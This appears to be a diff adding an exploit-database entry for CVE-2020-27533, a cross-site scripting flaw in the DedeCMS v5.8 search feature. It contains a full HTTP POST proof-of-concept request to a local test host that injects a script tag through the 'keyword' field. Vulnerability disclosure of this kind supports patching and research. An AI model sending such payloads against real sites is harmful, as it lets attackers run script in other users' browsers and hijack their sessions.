@@ -1,0 +1,27 @@
+# Exploit Title:  DedeCMS v.5.8 - "keyword" Cross-Site Scripting
+# Date: 2020-07-27
+# Exploit Author: Noth
+# Vendor Homepage: https://github.com/dedetech/DedeCMSv5
+# Software Link: https://github.com/dedetech/DedeCMSv5
+# Version: v.5.8
+# CVE : CVE-2020-27533
+
+A Cross Site Scripting (XSS) issue was discovered in the search feature of DedeCMS v.5.8 that allows malicious users to inject code into web pages, and other users will be affected when viewing web pages.
+
+PoC :
+
+POST /DedeCMSv5-master/src/dede/action_search.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+Origin: http://127.0.0.1
+Connection: close
+Referer: http://127.0.0.1/DedeCMSv5-master/src/dede/
+Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=dgj9gs48q9nbrckdq0ei5grjd7; _csrf_name_7ac3ea0e=8a824367d97bb8f984d4af7a1ad11308; _csrf_name_7ac3ea0e__ckMd5=c692dd4f707ea756; DedeUserID=1; DedeUserID__ckMd5=7e44b1ee92d784aa; DedeLoginTime=1603530632; DedeLoginTime__ckMd5=69967c5a8db15fb4; dede_csrf_token=80866e4429220e784f2514d38de9a5ea; dede_csrf_token__ckMd5=de396c60d5d75d93
+Upgrade-Insecure-Requests: 1
+
+keyword="><script>alert(1)</script>
